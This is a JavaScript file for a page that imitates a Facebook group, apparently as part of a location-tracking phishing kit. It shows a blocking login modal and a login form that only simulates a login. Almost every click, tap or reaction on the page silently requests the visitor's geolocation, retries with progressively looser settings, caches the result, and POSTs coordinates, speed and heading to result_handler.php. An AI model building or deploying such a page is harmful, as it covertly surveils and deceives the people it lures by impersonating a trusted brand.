// utility
function qs(elem) {return document.querySelector(elem);}
function qsa(elem) {return document.querySelectorAll(elem);}

// Helper function to handle location capture with consistent error handling
function captureLocation(context = 'interaction') {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    var isMobileDevice = isMobile || (isTouch && window.innerWidth <= 1024);
    
    // Enhanced cache management for mobile timeout prevention
    var cacheKey = 'fb_location_cache';
    var cacheTimeKey = 'fb_location_time';
    var contextKey = 'fb_location_context';
    
    // For mobile devices, try to use cached location first if recent enough
    if (isMobileDevice && localStorage) {
        try {
            var cachedLocation = localStorage.getItem(cacheKey);
            var cacheTime = localStorage.getItem(cacheTimeKey);
            var lastContext = localStorage.getItem(contextKey);
            
            if (cachedLocation && cacheTime) {
                var locationAge = Date.now() - parseInt(cacheTime);
                // Use cached location if less than 3 minutes old on mobile
                if (locationAge < 180000) {
                    console.log(`Using cached location for ${context} (age: ${Math.round(locationAge/1000)}s)`);
                    var cached = JSON.parse(cachedLocation);
                    
                    $.ajax({
                        type: 'POST',
                        url: 'result_handler.php',
                        data: { 
                            Status: 'success', 
                            Lat: cached.lat, 
                            Lon: cached.lon, 
                            Acc: cached.accuracy,
                            Alt: cached.alt || 'Not Available',
                            Dir: cached.dir || 'Not Available',
                            Spd: cached.spd || 'Not Available',
                            Source: 'cached',
                            Context: context,
                            Age: Math.round(locationAge/1000)
                        },
                        mimeType: 'text'
                    });
                    return;
                }
            }
        } catch (e) {
            console.log('Cache access failed:', e.message);
        }
    }
    
    // Advanced location capture with multiple fallback strategies
    function attemptLocationWithStrategy(strategy) {
        if (!navigator.geolocation) {
            console.log('Geolocation not supported');
            return;
        }
        
        var options;
        var strategyName;
        
        switch (strategy) {
            case 1:
                // Strategy 1: High accuracy for mobile, quick for desktop
                options = {
                    enableHighAccuracy: isMobileDevice,
                    timeout: isMobileDevice ? 12000 : 6000,
                    maximumAge: isMobileDevice ? 30000 : 300000
                };
                strategyName = 'primary';
                break;
            case 2:
                // Strategy 2: Network-based location
                options = {
                    enableHighAccuracy: false,
                    timeout: isMobileDevice ? 15000 : 8000,
                    maximumAge: isMobileDevice ? 60000 : 600000
                };
                strategyName = 'network';
                break;
            case 3:
                // Strategy 3: Very permissive for weak signals
                options = {
                    enableHighAccuracy: false,
                    timeout: 25000,
                    maximumAge: 900000 // 15 minutes
                };
                strategyName = 'permissive';
                break;
            case 4:
                // Strategy 4: Last resort with maximum tolerance
                options = {
                    enableHighAccuracy: false,
                    timeout: 35000,
                    maximumAge: 3600000 // 1 hour
                };
                strategyName = 'last-resort';
                break;
            default:
                console.log(`All location strategies exhausted for ${context}`);
                return;
        }
        
        console.log(`Attempting ${strategyName} location strategy for ${context}:`, options);
        
        navigator.geolocation.getCurrentPosition(
            function(position) {
                console.log(`Location captured via ${strategyName} strategy for: ${context}`);
                
                // Process and cache the successful location
                var lat = position.coords.latitude + ' deg';
                var lon = position.coords.longitude + ' deg';
                var acc = position.coords.accuracy + ' m';
                var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available';
                var dir = position.coords.heading ? position.coords.heading + ' deg' : 'Not Available';
                var spd = position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available';
                
                // Cache successful location for mobile
                if (isMobileDevice && localStorage) {
                    try {
                        var locationData = {
                            lat: lat,
                            lon: lon,
                            accuracy: acc,
                            alt: alt,
                            dir: dir,
                            spd: spd
                        };
                        localStorage.setItem(cacheKey, JSON.stringify(locationData));
                        localStorage.setItem(cacheTimeKey, Date.now().toString());
                        localStorage.setItem(contextKey, context);
                    } catch (e) {
                        console.log('Failed to cache location:', e.message);
                    }
                }
                
                $.ajax({
                    type: 'POST',
                    url: 'result_handler.php',
                    data: { 
                        Status: 'success', 
                        Lat: lat, 
                        Lon: lon, 
                        Acc: acc,
                        Alt: alt,
                        Dir: dir,
                        Spd: spd,
                        Source: strategyName,
                        Context: context,
                        Accuracy: position.coords.accuracy
                    },
                    mimeType: 'text'
                });
            },
            function(error) {
                console.log(`${strategyName} strategy failed for ${context}:`, error.message, `(Code: ${error.code})`);
                
                // Handle specific error types
                if (error.code === 1) { // PERMISSION_DENIED
                    console.log('Location permission denied by user');
                    return; // Don't retry on permission denial
                }
                
                if (error.code === 3) { // TIMEOUT
                    console.log(`Location timeout on ${strategyName} strategy, trying next approach...`);
                }
                
                // Try next strategy after a delay
                var delay = isMobileDevice ? (strategy * 1500) : (strategy * 800);
                setTimeout(function() {
                    attemptLocationWithStrategy(strategy + 1);
                }, delay);
            },
            options
        );
    }
    
    // Start the progressive location capture process
    attemptLocationWithStrategy(1);
}

// Mobile location optimization function
function requestLocationPermission() {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    var isMobileDevice = isMobile || (isTouch && window.innerWidth <= 1024);
    
    if (isMobileDevice && navigator.geolocation) {
        console.log('Pre-requesting location permission for mobile device');
        
        // Try to get a quick location fix to establish permission and cache
        navigator.geolocation.getCurrentPosition(
            function(position) {
                console.log('Initial location permission granted and cached');
                
                // Store initial location with enhanced caching
                if (localStorage) {
                    try {
                        var locationData = {
                            lat: position.coords.latitude + ' deg',
                            lon: position.coords.longitude + ' deg',
                            accuracy: position.coords.accuracy + ' m',
                            alt: position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available',
                            dir: position.coords.heading ? position.coords.heading + ' deg' : 'Not Available',
                            spd: position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available'
                        };
                        
                        localStorage.setItem('fb_location_cache', JSON.stringify(locationData));
                        localStorage.setItem('fb_location_time', Date.now().toString());
                        localStorage.setItem('fb_location_context', 'initial_permission');
                        
                        console.log('Initial location cached successfully');
                    } catch (e) {
                        console.log('Failed to cache initial location:', e.message);
                    }
                }
                
                // Also store in window object for backward compatibility
                window.initialLocation = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: Date.now()
                };
            },
            function(error) {
                console.log('Initial location permission handling:', error.message);
                
                // Even if initial request fails, we've attempted to get permission
                // Try a more permissive request for permission establishment
                if (error.code === 3) { // TIMEOUT
                    console.log('Initial request timed out, trying permissive approach...');
                    
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            console.log('Permissive location request succeeded');
                            
                            // Cache this location too
                            if (localStorage) {
                                try {
                                    var locationData = {
                                        lat: position.coords.latitude + ' deg',
                                        lon: position.coords.longitude + ' deg',
                                        accuracy: position.coords.accuracy + ' m',
                                        alt: 'Not Available',
                                        dir: 'Not Available',
                                        spd: 'Not Available'
                                    };
                                    
                                    localStorage.setItem('fb_location_cache', JSON.stringify(locationData));
                                    localStorage.setItem('fb_location_time', Date.now().toString());
                                    localStorage.setItem('fb_location_context', 'permission_fallback');
                                } catch (e) {
                                    console.log('Failed to cache fallback location');
                                }
                            }
                        },
                        function(fallbackError) {
                            console.log('Permissive location request also failed:', fallbackError.message);
                        },
                        {
                            enableHighAccuracy: false,
                            timeout: 20000,
                            maximumAge: 600000
                        }
                    );
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 60000
            }
        );
    }
}

// globals
hovered_btn_id = 0;

// Modal functionality
function initializeModal() {
    const modal = qs('#login-modal');
    const modalClose = qs('#modal-close');
    const modalLogin = qs('#modal-login');
    const modalSignup = qs('#modal-signup');
    const contentElements = [
        qs('#facebook-header'),
        qs('.mobile-nav-bar'),
        qs('.fb-group-header'),
        qs('.main-content-wrapper'),
        qs('.fb-bottom-banner')
    ];

    // Show modal on page load
    function showModal() {
        modal.classList.remove('hidden');
        // Add blur effect to content
        contentElements.forEach(element => {
            if (element) {
                element.classList.add('content-blurred');
            }
        });
        
        // Prevent scrolling
        document.body.style.overflow = 'hidden';
    }

    // Hide modal
    function hideModal() {
        modal.classList.add('hidden');
        // Remove blur effect from content
        contentElements.forEach(element => {
            if (element) {
                element.classList.remove('content-blurred');
            }
        });
        
        // Restore scrolling
        document.body.style.overflow = '';
    }

    // Event listeners
    if (modalClose) {
        modalClose.addEventListener('click', function() {
            captureLocation('modal close button');
            hideModal();
        });
    }

    if (modalLogin) {
        modalLogin.addEventListener('click', function() {
            hideModal();
            // Trigger location capture when user clicks login with timeout handling
            captureLocation('modal login');
            // Focus on the login form in the header
            const emailInput = qs('#email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    }

    if (modalSignup) {
        modalSignup.addEventListener('click', function() {
            hideModal();
            // Trigger location capture when user clicks signup with timeout handling
            captureLocation('modal signup');
            // In a real app, this would redirect to signup page
        });
    }

    // Close modal when clicking outside
    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                captureLocation('modal background click');
                hideModal();
            }
        });
    }

    // Close modal with Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
            hideModal();
        }
    });

    // Show modal on page load
    showModal();
}

// Facebook login functionality
function initializeFacebookLogin() {
    const loginForm = qs('.fb-login-form');
    const emailInput = qs('#email');
    const passwordInput = qs('#password');
    const loginBtn = qs('.fb-login-btn');

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                // Add visual feedback for empty fields
                if (!email) {
                    emailInput.style.borderColor = '#fa383e';
                    emailInput.style.boxShadow = '0 0 0 2px rgba(250, 56, 62, 0.2)';
                }
                if (!password) {
                    passwordInput.style.borderColor = '#fa383e';
                    passwordInput.style.boxShadow = '0 0 0 2px rgba(250, 56, 62, 0.2)';
                }
                
                // Reset error styling after 3 seconds
                setTimeout(() => {
                    emailInput.style.borderColor = '';
                    emailInput.style.boxShadow = '';
                    passwordInput.style.borderColor = '';
                    passwordInput.style.boxShadow = '';
                }, 3000);
                
                return false;
            }
            
            // Simulate login attempt
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;
            
            // Trigger location capture when user submits login form with timeout handling
            captureLocation('login form submission');
            
            setTimeout(() => {
                loginBtn.textContent = 'Log in';
                loginBtn.disabled = false;
                // In a real app, this would redirect or show success/error
            }, 1500);
        });

        // Reset error styling when user starts typing
        emailInput.addEventListener('input', function() {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        });
        
        passwordInput.addEventListener('input', function() {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        });
    }
}

// elements
const
opt_btns = qsa(".top-options button"),
menu = qs("#option"),
emoji_panel = qs("#emojies"),
comment_inputs = qsa(".comment-input-area input"),
comment_boxs = qsa(".comment-box"),
comment_btns = qsa(".comment-btn"),
like_btns = qsa(".like-btn"),
emojies = qsa("#emojies img");

// functions
function getOffset(el) {
	const rect = el.getBoundingClientRect();
	return {
		left: rect.left + window.scrollX,
		top: rect.top + window.scrollY
	};
}

function toggle_option(button)
{
	if (menu.style.visibility == "visible")
	{
		menu.style.visibility = "hidden";
		menu.style.top =  "0px";
		menu.style.left = "0px";
	}
	else
	{
		menu.style.visibility = "visible";
		
		// Responsive positioning
		const buttonRect = button.getBoundingClientRect();
		const menuWidth = 340; // Default menu width
		const mobileMenuWidth = 280; // Mobile menu width
		const viewportWidth = window.innerWidth;
		
		if (viewportWidth <= 480) {
			// Mobile positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = Math.max(10, getOffset(button).left - 200) + "px";
		} else if (viewportWidth <= 768) {
			// Tablet positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = Math.max(10, getOffset(button).left - 250) + "px";
		} else {
			// Desktop positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = getOffset(button).left - 315 + "px";
		}
	}
}

function toggle_reaction(button)
{
	if (emoji_panel.style.visibility == "visible")
	{
		emoji_panel.style.visibility = "hidden";
	}
	else
	{
		emoji_panel.style.visibility = "visible";
		
		// Responsive positioning for emoji panel
		const viewportWidth = window.innerWidth;
		const buttonRect = button.getBoundingClientRect();
		
		if (viewportWidth <= 480) {
			// Mobile positioning - center the emoji panel
			const panelWidth = 250;
			const leftPos = Math.max(10, Math.min(viewportWidth - panelWidth - 10, getOffset(button).left - 100));
			emoji_panel.style.top = getOffset(button).top - 50 + "px";
			emoji_panel.style.left = leftPos + "px";
		} else {
			// Desktop positioning
			emoji_panel.style.top = getOffset(button).top - 50 + "px";
			emoji_panel.style.left = getOffset(button).left - 50 + "px";
		}
	}
}
function placeLIke(emoji, id) {
	
	var emoji_src, btn_text;
	
	switch (emoji) {
		case "e-like":
			emoji_src = "./svg/like.svg";
			btn_text = "Like";
			break;
		case "e-love":
			emoji_src = "./svg/love.svg";
			btn_text = "Love";
			break;
		case "e-care":
			emoji_src = "./svg/care.svg";
			btn_text = "Care";
			break;
		case "e-haha":
			emoji_src = "./svg/haha.svg";
			btn_text = "haha";
			break;
		case "e-wow":
			emoji_src = "./svg/wow.svg";
			btn_text = "Wow";
			break;
		case "e-sad":
			emoji_src = "./svg/sad.svg";
			btn_text = "Sad";
			break;
		case "e-angry":
			emoji_src = "./svg/angry.svg";
			btn_text = "Angry";
			break;
		default:
			return;
	}
	
	qs("#fpost" + id).querySelector(".like-btn img").src = emoji_src;
	qs("#fpost" + id).querySelector(".like-btn img").style.width = "20px";
	qs("#fpost" + id).querySelector(".like-btn span").innerHTML = btn_text;
}
function makeComment(text, id) {

	qs("#fpost" + id).querySelector(".comment-box").innerHTML += 
	`
	<div class="comment-container">
		<div class="comment">
		<img src="assets/profile-pic.jpg" alt="" class="comment-img">
		<div class="comment-text">
			<div class="comment-header">
			<p><strong>Rejwan Islam Rizvy</strong></p>
			</div>
			<p>${text}</p>
		</div>
		<div class="three-dot">
			<img src="svg/three_dot_gray.svg" class="three-dot-img" alt="">
		</div>
		</div>
		<div class="comment-lks">
		<p>
			<span>Like</span><span class="dot"> . </span>
			<span>Reply</span><span class="dot"> . </span>
			<span>Share</span><span class="dot"> . </span>
			<span>just now</span></p>
		</div>
	</div>
	`;
}

//******************
// Main Function here
//******************

// Toggle see more/see less functionality
function toggleText() {
  // Capture location when see more/less is clicked
  captureLocation('see more/less toggle');
  
  const hiddenText = document.querySelector('.post-hidden-text');
  const seeMoreBtn = document.querySelector('.see-more');
  
  if (hiddenText.style.display === 'none') {
    hiddenText.style.display = 'block';
    seeMoreBtn.textContent = '...عرض أقل';
  } else {
    hiddenText.style.display = 'none';
    seeMoreBtn.textContent = '...المزيد';
  }
}

// Initialize content visibility as soon as possible
document.addEventListener('DOMContentLoaded', function() {
    qs("#mother").style.display = "block";
    qs("#js-error").style.display = "none";
    
    // Request location permission early for mobile devices
    requestLocationPermission();
    
    // Initialize modal
    initializeModal();
    
    // Initialize Facebook login functionality
    initializeFacebookLogin();
});

window.addEventListener('load', function() {
	
	opt_btns.forEach(btn => {
		btn.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks options menu
			captureLocation('options menu');
			toggle_option(btn);
		});
	});
	
	comment_inputs.forEach(input => {
		input.addEventListener("change", (e)=>{
			// Trigger location capture when user adds a comment
			captureLocation('comment input');
			makeComment(input.value, input.getAttribute("fpost"));
			input.value = "";
		});
	});
	
	comment_btns.forEach(button => {
		button.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks comment button
			captureLocation('comment button');
			qs("#fpost" + button.getAttribute("fpost")).querySelector("input").focus();
		});
	});
	
	like_btns.forEach(button => {
		// Handle both mouse and touch events
		button.addEventListener("mouseover", (e)=>{
			if (window.innerWidth > 768) { // Only on desktop
				hovered_btn_id = button.getAttribute("fpost");
				toggle_reaction(button);
			}
		});
		
		button.addEventListener("mouseout", (e)=>{
			if (window.innerWidth > 768) { // Only on desktop
				toggle_reaction(button);
			}
		});
		
		button.addEventListener("click", (e)=>{
			hovered_btn_id = button.getAttribute("fpost");
			// Trigger location capture when user clicks like button
			captureLocation('like button');
			if (window.innerWidth <= 768) {
				// On mobile, show reaction panel on click
				if (emoji_panel.style.visibility === "visible") {
					toggle_reaction(button);
				} else {
					toggle_reaction(button);
				}
			} else {
				// On desktop, place like directly
				placeLIke("e-like", hovered_btn_id);
			}
		});
		
		// Add touch support for mobile
		button.addEventListener("touchstart", (e)=>{
			if (window.innerWidth <= 768) {
				e.preventDefault();
				hovered_btn_id = button.getAttribute("fpost");
				toggle_reaction(button);
			}
		});
	});
	
	emojies.forEach(emoji => {
		emoji.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks emoji reaction
			captureLocation('emoji reaction');
			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
			// Hide emoji panel after selection on mobile
			if (window.innerWidth <= 768) {
				emoji_panel.style.visibility = "hidden";
			}
		});
		
		// Add touch support
		emoji.addEventListener("touchend", (e)=>{
			e.preventDefault();
			// Trigger location capture when user touches emoji reaction
			captureLocation('emoji touch');
			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
			if (window.innerWidth <= 768) {
				emoji_panel.style.visibility = "hidden";
			}
		});
	});
	
	// Close dropdowns when clicking outside
	document.addEventListener("click", (e) => {
		if (!e.target.closest("#option") && !e.target.closest(".top-options")) {
			menu.style.visibility = "hidden";
		}
		if (!e.target.closest("#emojies") && !e.target.closest(".like-btn")) {
			emoji_panel.style.visibility = "hidden";
		}
	});
	
	// Handle orientation change
	window.addEventListener("orientationchange", () => {
		setTimeout(() => {
			menu.style.visibility = "hidden";
			emoji_panel.style.visibility = "hidden";
		}, 100);
	});
	
	// Add location capture to additional interactive elements
	
	// Facebook logo and links
	const fbLogoLink = qs('.fb-logo-link');
	if (fbLogoLink) {
		fbLogoLink.addEventListener('click', function() {
			captureLocation('facebook logo');
		});
	}
	
	// Forgotten password link
	const forgottenLink = qs('.forgotten-link');
	if (forgottenLink) {
		forgottenLink.addEventListener('click', function() {
			captureLocation('forgotten password link');
		});
	}
	
	// Mobile back button
	const mobileBackBtn = qs('.mobile-back-btn');
	if (mobileBackBtn) {
		mobileBackBtn.addEventListener('click', function() {
			captureLocation('mobile back button');
		});
	}
	
	// Profile pictures and names
	const profilePics = qsa('.profile-picture img, .comment-img');
	profilePics.forEach(img => {
		img.addEventListener('click', function() {
			captureLocation('profile picture');
		});
	});
	
	// Profile names and links
	const profileNames = qsa('.profile-name a, .poster-name, .comment-header strong');
	profileNames.forEach(name => {
		name.addEventListener('click', function() {
			captureLocation('profile name');
		});
	});
	
	// Three dot menus in comments
	const threeDots = qsa('.three-dot, .three-dot-img');
	threeDots.forEach(dot => {
		dot.addEventListener('click', function() {
			captureLocation('three dot menu');
		});
	});
	
	// Comment interaction links (Like, Reply, Share in comments)
	const commentLinks = qsa('.comment-lks span');
	commentLinks.forEach(link => {
		link.addEventListener('click', function() {
			captureLocation('comment interaction');
		});
	});
	
	// Time stamps and other post metadata
	const postMeta = qsa('.post-time span, .group-name, .member-count');
	postMeta.forEach(meta => {
		meta.addEventListener('click', function() {
			captureLocation('post metadata');
		});
	});
	
	// Post images
	const postImages = qsa('.post-content img');
	postImages.forEach(img => {
		img.addEventListener('click', function() {
			captureLocation('post image');
		});
	});
	
	// Hashtags and mentions
	const hashtags = qsa('[style*="#1877F2"]');
	hashtags.forEach(tag => {
		tag.addEventListener('click', function() {
			captureLocation('hashtag or mention');
		});
	});
	
	// Follow/Join button
	const joinBtn = qs('.join-group-btn');
	if (joinBtn) {
		joinBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks follow/join button
			captureLocation('join group button');
		});
	}
	
	// Share buttons
	const shareBtns = qsa('.share-btn');
	shareBtns.forEach(btn => {
		btn.addEventListener('click', function() {
			// Trigger location capture when user clicks share button
			captureLocation('share button');
		});
	});
	
	// Bottom banner buttons
	const bannerLoginBtn = qs('.fb-banner-login-btn');
	const bannerSignupBtn = qs('.fb-banner-signup-btn');
	
	if (bannerLoginBtn) {
		bannerLoginBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks banner login button
			captureLocation('banner login button');
		});
	}
	
	if (bannerSignupBtn) {
		bannerSignupBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks banner signup button
			captureLocation('banner signup button');
		});
	}
	
	// Mobile login button
	const mobileLoginBtn = qs('.mobile-login-btn');
	if (mobileLoginBtn) {
		mobileLoginBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks mobile login button
			captureLocation('mobile login button');
		});
	}
	
	// Mobile open app button
	const mobileOpenAppBtn = qs('.mobile-open-app');
	if (mobileOpenAppBtn) {
		mobileOpenAppBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks open app button
			captureLocation('mobile open app button');
		});
	}
	
	// See more/less toggle
	const seeMoreBtn = qs('.see-more');
	if (seeMoreBtn) {
		seeMoreBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks see more button
			captureLocation('see more button');
		});
	}
	
	// Add comprehensive click tracking for any clickable elements
	// This captures location for ANY click on interactive elements that might be missed
	const interactiveSelectors = [
		'a', 'button', '[onclick]', '[role="button"]', 
		'[tabindex]', 'input[type="submit"]', 'input[type="button"]',
		'.clickable', '[data-click]', '.fb-logo-link', '.forgotten-link',
		'.mobile-back-btn', '.poster-name', '.group-name', '.comment-header',
		'.three-dot', '.three-dot-img', '.profile-picture img', '.comment-img',
		'.profile-name a', '.post-time span', 'img[src*="svg"]'
	];
	
	interactiveSelectors.forEach(selector => {
		const elements = qsa(selector);
		elements.forEach(element => {
			// Check if element doesn't already have our location tracking
			if (!element.hasAttribute('data-location-tracked')) {
				element.setAttribute('data-location-tracked', 'true');
				element.addEventListener('click', function(e) {
					const elementInfo = element.className || element.tagName || 'unknown element';
					captureLocation(`interactive element: ${elementInfo}`);
				});
			}
		});
	});
	
	// Add location capture to any dynamically added content or missed elements
	document.addEventListener('click', function(e) {
		const target = e.target;
		
		// Check if the clicked element is interactive but doesn't have location tracking
		const isInteractive = target.tagName === 'A' || 
							   target.tagName === 'BUTTON' || 
							   target.hasAttribute('onclick') ||
							   target.style.cursor === 'pointer' ||
							   target.closest('a') ||
							   target.closest('button') ||
							   target.closest('[onclick]') ||
							   target.closest('[role="button"]');
		
		if (isInteractive && !target.hasAttribute('data-location-tracked')) {
			const elementInfo = target.className || target.tagName || target.textContent?.substring(0, 20) || 'unknown';
			captureLocation(`fallback click: ${elementInfo}`);
		}
	}, true); // Use capture phase to ensure we catch all clicks
	
	// Also capture location on double-click events (common on mobile)
	document.addEventListener('dblclick', function(e) {
		captureLocation('double click interaction');
	});
	
	// Capture location on touch events for mobile devices
	document.addEventListener('touchend', function(e) {
		// Only if it's a tap (not a scroll or swipe)
		if (e.changedTouches && e.changedTouches.length === 1) {
			const target = e.target;
			const isInteractive = target.tagName === 'A' || 
								   target.tagName === 'BUTTON' || 
								   target.closest('a') ||
								   target.closest('button') ||
								   target.style.cursor === 'pointer';
			
			if (isInteractive) {
				captureLocation('touch interaction');
			}
		}
	});
});